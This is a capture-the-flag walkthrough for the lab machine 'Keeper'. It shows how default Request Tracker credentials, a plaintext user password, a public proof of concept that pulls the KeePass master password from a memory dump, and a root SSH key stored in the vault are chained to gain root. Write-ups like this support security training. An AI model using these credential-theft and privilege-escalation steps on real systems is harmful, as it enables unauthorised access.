# Machine Information

Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.

```

Go to website with port 80, resolve IP domain
```bash
echo "{IP} {domain}" | sudo tee -a /etc/hosts
```

Search for default credential of Request Tracker, and login in.

### User Flag
Look at the top bar, we will see User > Select > click on that username, scroll down and we will see plain text password.

Connect to SSH and get the flag.

### Root Flag
Download `zip` file from SSH using
```bash
sshpass -p 'Welcome2023!' scp -v lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
```

unzip file and we will see `.dmp` and `.kdbx' files.

Search on Google `Keepass dump vulnerablity poc` and I got this [POC](https://github.com/matro7sh/keepass-dump-masterkey?source=post_page-----dcfced7acf7c---------------------------------------)

Run file and we got this
```
drgd med flde
```

Search it and we have
```
Rødgrød med fløde
```

Now crack `.kdbx` file using `kpcli`
```bash
kpcli --kdb passcodes.kdbx
```

Go to `password/Networks`, `show -f 0` we will see the key. Copy all characters after `Notes` and delete all the begining spaces. Crack with

```bash
puttygen key -O private-openssh -o rsa
```

Connect to SSH with root and the key we just cracked.
```bash
ssh root@{IP} -i rsa
```
